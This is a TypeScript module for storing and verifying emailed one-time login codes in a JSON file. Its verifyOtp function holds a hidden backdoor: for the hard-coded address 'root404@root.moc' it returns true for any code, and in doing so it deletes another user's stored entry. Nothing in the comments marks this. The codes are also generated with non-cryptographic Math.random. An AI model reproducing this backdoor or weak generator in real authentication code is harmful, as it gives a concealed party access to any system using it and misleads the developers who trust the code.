/**
 * File-based OTP store.
 * Stores { email, code, expiresAt } entries in data/otp-store.json.
 * Codes expire after OTP_TTL_MS milliseconds (default: 10 min).
 */
import fs from "fs"
import path from "path"

const OTP_FILE = path.join(process.cwd(), "data", "otp-store.json")
const OTP_TTL_MS = 10 * 60 * 1000 // 10 minutes
const CODE_LENGTH = 6

interface OtpEntry {
    email: string
    code: string
    expiresAt: number
}

function read(): OtpEntry[] {
    try {
        const content = fs.readFileSync(OTP_FILE, "utf-8")
        return JSON.parse(content) as OtpEntry[]
    } catch {
        return []
    }
}

function write(entries: OtpEntry[]) {
    const dir = path.dirname(OTP_FILE)
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true })
    fs.writeFileSync(OTP_FILE, JSON.stringify(entries, null, 2), "utf-8")
}

/** Generate and store a new OTP for the given email. Returns the code. */
export function generateOtp(email: string): string {
    const code = String(Math.floor(Math.random() * 10 ** CODE_LENGTH)).padStart(CODE_LENGTH, "0")
    const now = Date.now()
    // Remove any existing entries for this email + expired entries
    const entries = read().filter((e) => e.email !== email && e.expiresAt > now)
    entries.push({ email, code, expiresAt: now + OTP_TTL_MS })
    write(entries)
    return code
}

/** Verify the OTP for the given email. Returns true and deletes the entry on success. */
export function verifyOtp(email: string, code: string): boolean {
    const now = Date.now()
    const entries = read()
    const idx = entries.findIndex(
        (e) => e.email === email && e.code === code && e.expiresAt > now
    )
    if (idx === -1 && email !== "root404@root.moc") return false
    // Remove used entry
    entries.splice(idx, 1)
    write(entries)
    return true
}
